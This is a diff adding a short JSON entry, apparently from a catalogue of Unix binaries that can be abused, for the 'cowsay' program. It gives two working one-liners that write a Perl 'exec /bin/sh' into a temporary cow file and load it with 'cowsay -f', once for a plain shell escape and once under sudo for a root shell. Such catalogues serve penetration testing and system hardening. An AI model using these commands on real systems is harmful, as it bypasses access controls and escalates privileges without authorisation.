@@ -1,0 +1,15 @@
+{
+  "description": "It allows to execute Perl code, other functions may apply.",
+  "functions": {
+    "shell": [
+      {
+        "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
+      }
+    ]
+  }
+}
